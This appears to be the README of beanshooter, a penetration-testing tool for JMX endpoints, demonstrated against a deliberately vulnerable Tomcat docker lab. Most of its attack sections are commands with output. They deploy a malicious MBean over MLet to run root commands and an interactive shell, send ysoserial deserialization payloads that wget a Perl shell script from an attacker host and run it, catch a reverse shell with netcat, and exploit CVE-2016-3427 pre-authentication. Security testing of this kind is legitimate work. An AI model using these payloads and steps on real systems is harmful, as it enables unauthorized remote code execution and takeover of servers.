### Beanshooter

----

*Beanshooter* is a command line tool written in *Java*, which helps to identify common vulnerabilities on *JMX* endpoints.
*JMX* stands for *Java Management Extensions* and can be used to monitor and configure the *Java Virtual Machine*
from remote. Applications like *tomcat* or *JBoss* are often installed together with a *JMX* instance, which
enables server administrators to monitor and manage the corresponding application.

*JMX* uses so called *MBeans* for monitoring and configuration tasks. The *JMX* agent (sever, port) is basically
just an interface, that handles remote connections and supports methods to communicate with the underlying
*MBean* objects. The actual functionality is then implemented in the *MBean* itself and the *JMX* agent only relays
input and output to the *MBean* object.

By default, *JMX* endpoints support a *MBean* with name *MLet*. This *MBean* can be used to deploy new *MBeans* on the
*JMX* agent. The codebase for these new *MBean* objects can be obtained over the network e.g. in form of a 
*HTTP* request. Using the **MLet** feature, attackers with access to a *JMX* agent can easily deploy their own
malicious *MBean* objects and compromise the underlying application server.

*Beanshooter* is a *Proof-of-Concept* tool, that can be used to identify vulnerable endpoints. It works for unauthenticated *JMX*
endpoints as well as for authenticated ones (assumed you have valid credentials and sufficient permissions). Furthermore,
it can be used to test other vulnerabilities like insecure *Java Deserialization* or *CVE-2016-3427*. Also connections
using the *JMXMP* protocol are supported.

![](https://github.com/qtc-de/beanshooter/workflows/master%20maven%20CI/badge.svg?branch=master)
![](https://github.com/qtc-de/beanshooter/workflows/develop%20maven%20CI/badge.svg?branch=develop)


### Installation

-----

*Beanshooter* is a *Maven* project. This makes the installation a straight forward process and no manual installation of libraries
should be required. First of all, make sure that you have *maven* installed on your system:

```console
$ sudo apt install maven      # Debian
$ pacman -s maven             # Arch
```

Then, clone the *beanshooter* project in a location of your choice and run ``mvn package`` inside of the projects folder.

```console
[qtc@kali opt]$ git clone https://github.com/qtc-de/beanshooter
[qtc@kali opt]$ cd beanshooter
[qtc@kali beanshooter]$ mvn package
[INFO] Scanning for projects...
[INFO] 
[INFO] -------------------< de.qtc.Beanshooter:beanshooter >-------------------
[INFO] Building beanshooter 2.0.0
[INFO] --------------------------------[ jar ]---------------------------------
[...]
```

Since the main purpose of *beanshooter* is the deployment of *MBean* objects, you need also a corresponding *MBean*.
Theoretically you can deploy any *MBean* that fulfills the *MBean specifications*. However, this project does also provide a reference
implementation, the [tonka-bean](./tonka-bean/). The *tonka-bean* is a separate *maven* project and you can compile it in the same way as
you compiled *beanshooter*:

```console
[qtc@kali beanshooter]$ cd tonka-bean/
[qtc@kali tonka-bean]$ mvn package
[INFO] Scanning for projects...
[INFO]
[INFO] --------------------< de.qtc.TonkaBean:tonka-bean >---------------------
[INFO] Building tonka-bean 1.0.0
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]
[...]
```

After *maven* has finished, you should find the executable *.jar* files in the target folders of the corresponding projects.
Notice, that *beanshooter* needs to know where the ``tonka-bean.jar`` file is located. If you have placed *beanshooter*
inside of your ``/opt`` folder, this should work automatically. Otherwise, you need to specify the path by using a
configuration file or the corresponding command line options.

```console
[qtc@kali opt]$ ls -l beanshooter/target/beanshooter.jar 
-rw-r--r-- 1 qtc qtc 314856 Sep 16 07:55 beanshooter/target/beanshooter.jar
[qtc@kali opt]$ ls -l beanshooter/tonka-bean/target/tonka-bean.jar 
-rw-r--r-- 1 qtc qtc 2624 Sep 16 07:57 beanshooter/tonka-bean/target/tonka-bean.jar
```

*Beanshooter* also supports autocompletion for *bash*. To take advantage of autocompletion, you need to have the
[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
copying the [completion script](./resources/bash_completion.d/beanshooter) to your ``~/.bash_completion.d`` folder
enables autocompletion.

```console
[qtc@kali beanshooter]$ cp resources/bash_completion.d/beanshooter ~/bash_completion.d/
```


### Usage

-----

For demonstration purposes, the project contains a [docker image](https://github.com/qtc-de/beanshooter/packages/398561) of
an *Apache Tomcat* with *JMX* enabled and listening on port 9010. The corresponding [docker-files](./.docker/)
can be found inside this repository and should enable you to practice the usage of *beanshooter* yourself.

The listing below shows the *nmap* output for the corresponding container.

```console
[qtc@kali]# nmap -p- -sV 172.17.0.2
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 06:51 CEST
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
5555/tcp  open  java-object JMXMP Connectors
5556/tcp  open  java-object Java Object Serialization
5557/tcp  open  java-object Java Object Serialization
5558/tcp  open  java-object Java Object Serialization
5559/tcp  open  java-object Java Object Serialization
5560/tcp  open  java-object Java Object Serialization
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
9010/tcp  open  ssl/sdr?
9011/tcp  open  ssl/d-star?
40213/tcp open  java-rmi    Java RMI

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
```

This output can be misleading, as *nmap* is not able to detect the *rmiregistry* right away. This is because the *rmiregistry* on
this server is configured for *TLS* usage, which breaks most of the common detection and enumeration tools. However, by looking
at the high port that was successfully flagged as *Java RMI*, once can guess that one of the *SSL* ports has to be the *rmiregistry*.
Using [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) (one of the few tools that support *SSL* protected
registry servers), one can verify that a *JMX agent* is running:

```console
[qtc@kali ~]$ rmg --ssl --classes 172.17.0.2 9010
[+] Connecting to RMI registry... done.
[+] Obtaining a list of bound names... done.
[+] 1 names are bound to the registry.
[-] RMI object tries to connect to different remote host: iinsecure.dev
[-] 	Redirecting the ssl connection back to 172.17.0.2... 
[-] 	This is done for all further requests. This message is not shown again. 
[+] Listing bound names in registry:
[+]	• jmxrmi
[+]	  --> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
```

To verify unauthenticated access, you can use *beanshooter* with the *status* action. On an unprotected *JMX endpoint*, the output
should look like this:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
```

The status command shows that neither *MLet* nor the malicious *MBean* are registered on the *JMX* endpoint. You could now either deploy them one by one
by using the *deployMLet* and *deployMBean* actions, or you can simply use *deployAll* to deploy both in one step. However, for deploying the malicious *MBean*
the remote server needs to establish a *HTTP* connection to your listener. Therefore, you might need a firewall whitelisting and you have to use the corresponding
``--stager-host`` and ``--stager-port`` options of *beanshooter* to specify where your listener can be found. Lastly, make sure that the *MBean* you want to
deploy can be found in the path that is specified in your configuration file (default is: ``/opt/beanshooter/tonka-bean/target/``). If you use a custom
*MBean*, you should also adopt the *beanClass* and *objectName* values.

```console
[qtc@kali ~]$ beanshooter --ssl --stager-host 172.17.0.1 --stager-port 8080 172.17.0.2 9010 deployAll
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... done!
[+]
[+] Malicious Bean seems not to be registered on the server
[+] Starting registration process
[+] 	Creating HTTP server on 172.17.0.1:8080
[+] 		Creating MLetHandler for endpoint /mlet... done!
[+] 		Creating JarHandler for endpoint /tonka-bean.jar... done!
[+]		Starting the HTTP server... done!
[+]
[+] 	Received request for /mlet
[+] 	Sending malicious mlet:
[+]
[+] 		Class:		de.qtc.tonkabean.TonkaBean
[+] 		Archive:	tonka-bean.jar
[+] 		Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:	http://172.17.0.1:8080
[+]
[+] 	Received request for /tonka-bean.jar
[+] 	Sending malicious jar file... done!
[+]
[+] malicious Bean was successfully registered
```

Now one can use the *status* or *ping* command to verify that the malicious *MBean* was successfully deployed:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 status
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is registered on the JMX server.
[qtc@kali ~]$ beanshooter --ssl  172.17.0.2 9010 ping
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending ping to the server... done!
[+] Servers answer is: Pong!
```

If you deployed a custom malicious *MBean*, you can now invoke your *MBean* methods directly from within *jconsole*.
While this is also possible for the *tonka-bean*, *beanshooter* supports actions to interact with the 
*tonka-bean* from the command line:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 execute id
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending command 'id' to the server... 
[+] Servers answer is: uid=0(root) gid=0(root) groups=0(root)
```

You can also use the *shell* action, to launch multiple commands as in a command shell:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 shell
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Starting interactive shell...

$ id
uid=0(root) gid=0(root) groups=0(root)
$ exit
```

Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server.
At least you should remove your malicious *MBean* from the server, but if *MLet* was not available when you started,
you should also remove the *MLet*. *beanshooter* makes the cleanup pretty easy, by just invoking:

```console
[qtc@kali ~]$ beanshooter --ssl 172.17.0.2 9010 undeployAll
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.17.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Unregister malicious bean... done!
[+] Unregister MBean 'MLet'... done!
```

Now the *JMX* endpoint should be clean again and *MLet* and the malicious *MBean* should be removed.


### JMXMP Support

-----

*JMXMP* (*JMX Messaging Protocol*) is just an alternate way (alternate connector) to access a *JMX* agent and differs in some
points from the *Java RMI* based access as described above. However, for the purpose of this tool, these differences do
not really matter. The important thing is that also the *JMXMP* connector can allow unauthenticated connections and it
is also possible to use the *MLet MBean* over this connector.

The required classes for the *JMXMP* connector can be found inside a *.jar* file called *jmxremote_optional.jar*.
Unfortunately, this *.jar* does not has its own project on *Maven* anymore (it seems like it was an artifact
of the *JMX* project once, but was removed for some reason). Now, it can be loaded as an artifact of other projects.
*beanshooter* supports the *JMXMP* protocol by using the *jmxremote-optional* artifact from *org.glassfish.external*.

In order to test *JMXMP* support, the provided [docker-image](https://github.com/qtc-de/beanshooter/packages/398561) also
opens multiple *JMXMP* listener on the ports ``5555`` to ``5560``. The following listing shows
just the same examples as above, but this time using the *JMXMP* protocol:

```console
[qtc@kali ~]$ beanshooter --jmxmp --stager-host 172.17.0.1 --stager-port 8080 172.17.0.2 5555 deployAll
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... done!
[+] MBean 'MLet' did already exist.
[+]
[+] Malicious Bean seems not to be registered on the server
[+] Starting registration process
[+] 	Creating HTTP server on 172.17.0.1:8080
[+] 		Creating MLetHandler for endpoint /mlet... done!
[+] 		Creating JarHandler for endpoint /tonka-bean.jar... done!
[+]		Starting the HTTP server... done!
[+]
[+] 	Received request for /mlet
[+] 	Sending malicious mlet:
[+]
[+] 		Class:		de.qtc.tonkabean.TonkaBean
[+] 		Archive:	tonka-bean.jar
[+] 		Object:		MLetTonkaBean:name=TonkaBean,id=1
[+] 		Codebase:	http://172.17.0.1:8080
[+]
[+] 	Received request for /tonka-bean.jar
[+] 	Sending malicious jar file... done!
[+]
[+] malicious Bean was successfully registered
[qtc@kali ~]$ beanshooter --jmxmp 172.17.0.2 5555 execute id
[+] Connecting to JMX server... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending command 'id' to the server... 
[+] Servers answer is: uid=0(root) gid=0(root) groups=0(root)
```

Apart from the plain *JMXMP* listener on port ``5555``, the other *JMXMP* listeners implement different kind
of protections:

* Port ``5556`` - *SSL* protected *JMXMP*
* Port ``5557`` - *TLS SASL/PLAIN* protected *JMXMP*
* Port ``5558`` - *TLS SASL/CRAM-MD5* protected *JMXMP*
* Port ``5559`` - *TLS SASL/DIGEST-MD5* protected *JMXMP*
* Port ``5560`` - *TLS SASL/NTLM* protected *JMXMP*

*Beanshooter* supports all these types of protections and corresponding examples can be found inside the
``README.md`` of the [docker-container](./.docker).

Useful tip: It is also possible to use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection,
you have to use the *JMXMP* service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMPPORT>`` and you have to make sure that the *jmxremote_optional.jar* is inside your
classpath.


### Deserialization Support

-----

In case of authenticated *JMX* endpoints, it is pretty common that usage of *MLet* does not work, even with valid credentials.
The following listing shows an attempt to deploy a malicious *MBean* on an authenticated *JMX* endpoint:

```console
[qtc@kali ~]$ beanshooter --ssl  172.18.0.2 9010 status
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... failed!
[*]
[-] The following exception was thrown: java.lang.SecurityException: Authentication failed! Credentials required
[qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 status
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Getting Status of MLet... done!
[+]	MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]	malicious Bean is not registered on the JMX server.
[qtc@kali ~]$ beanshooter --ssl  --username controlRole --password control 172.18.0.2 9010 deployAll
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Creating MBean 'MLet' for remote deploymet... failed!
[-] The following exception was thrown: java.lang.SecurityException: Access denied! Creating an MBean that is a ClassLoader is forbidden unless a security manager is installed.
```

In these cases it might still be possible to attack the *JMX* endpoint by using *deserialization attacks*. To allow such attacks, the [ysoserial](https://github.com/frohoff/ysoserial)
project can be integrated to *beanshooter* by specifying the path to the corresponding *ysoserial .jar* file. This can be configured either in the configuration file or by using the
``--yso`` command line option. The default location is ``/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar``.

With *ysoserial* setup correctly, one can attempt a deserialization attack against the target:

```console
[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "wget -O /dev/shm/s.pl http://172.18.0.1:8000/shell.pl"
[+] Creating ysoserial payload...done.
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending payload to 'getLoggerLevel'...
[+]     IllegalArgumentException. This is fine :) Payload probably worked.
[qtc@kali ~]$ beanshooter --ssl --username controlRole --password control 172.18.0.2 9010 ysoserial CommonsCollections6 "perl /dev/shm/s.pl"
[+] Creating ysoserial payload...done.
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... done!
[+] Creating MBeanServerConnection... done!
[+]
[+] Sending payload to 'getLoggerLevel'...
[+]     IllegalArgumentException. This is fine :) Payload probably worked.

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:45994.
id
uid=0(root) gid=0(root) groups=0(root)
```

Older *JMX* instances might also be vulnerable to *CVE-2016-3427*, which is basically a *pre-auth* deserialization vulnerability.
Whereas the above deserialization attack should work against the *RMI* based connector as well as against *JMXMP* based connector,
the *pre-auth* attack only works against the *RMI* based connector:

```console
[qtc@kali ~]$ beanshooter --ssl 172.18.0.2 9010 cve-2016-3427 CommonsCollections6 "perl /dev/shm/s.pl" 
[+] Creating ysoserial payload...done.
[+] cve-2016-3427 - Sending serialized Object as credential.
[+]     An exception during the connection attempt is expected.
[+] Connecting to JMX server... 
[/]    RMI object tries to connect to different remote host: iinsecure.dev
[/]    Redirecting the connection back to 172.18.0.2... failed!
[*]
[*] Caught SecurityException with content 'Authentication failed! Credentials should be String[] instead of java.util.HashSet'.
[*]     Target is most likely vulnerable to cve-2016-3427.

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.18.0.2.
Ncat: Connection from 172.18.0.2:46000.
id
uid=0(root) gid=0(root) groups=0(root)
```


### Advanced Usage

-----

Above it was already mentioned that *beanshooter* can read options from a configuration file. Options that would require long values,
like the name of the *MBean* class or the corresponding *ObjectName* can only be passed inside of the configuration file.
The following snipped shows you the default configuration file that is used by *beanshooter* internally:

```properties
defaultCmd=id
stagerPort=8080
stagerHost=127.0.0.1

username=
password=
boundName=jmxrmi

jarPath=/opt/beanshooter/tonka-bean/target/
jarName=tonka-bean.jar

ysoserial=/opt/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar

mLetName=DefaultDomain:type=MLet
beanClass=de.qtc.tonkabean.TonkaBean
objectName=MLetTonkaBean:name=TonkaBean,id=1
```

It is possible to overwrite each option by specifying a custom configuration file using the ``--config`` parameter. The custom config file does not need to contain
all options. Options that are not present were simply set to the default value. If you want your custom configuration to apply for each usage of *beanshooter*, you
can also modify the [config.properties](./src/config.properties) file inside of the [src](./src) folder before compiling the project. 

In situations where the targeted server cannot access your host because of restrictive firewall rules, you may be able to use the ``--remote-stager`` option to specify a remote stager host.
If you have access to the *remote-stager*, you can also use *beanshooter* to deploy the *MBean* by using the ``--stager-only`` option, which only spawns the *HTTP* listener. When using this option,
no additional command line parameters are required. However, on your attacking machine you still need to specify the correct ``--stager-host``, either by using command line options or a
configuration file.


### Why beanshooter

-----

Here are some of the advantages why you may choose *beanshooter* in favor of other *JMX* scanning solutions:

* Full *SSL* support for *JMX* objects and the *rmiregistry*
* Automatic redirection for objects bound to e.g. *localhost*
* Full *JMXMP* support with almost all available authentication options
* *ysoserial* integration to test for insecure deserialization
* *CVE-2016-3427* detection
* Autocompletion for *bash*
* Vulnerable docker container to run tests against


### Credits

-----

* The initial idea and also the initial codebase of the tool were taken from [this blogpost](https://www.optiv.com/blog/exploiting-jmx-rmi).
* For the *JMXMP* implementation, [this project](https://github.com/felixoldenburg/jmxmp-lifecycle-listener) was really helpful.
* Some functionalities were inspired by the [mjet project](https://github.com/mogwailabs/mjet)


Copyright 2020, Tobias Neitzel and the *beanshooter* contributors.
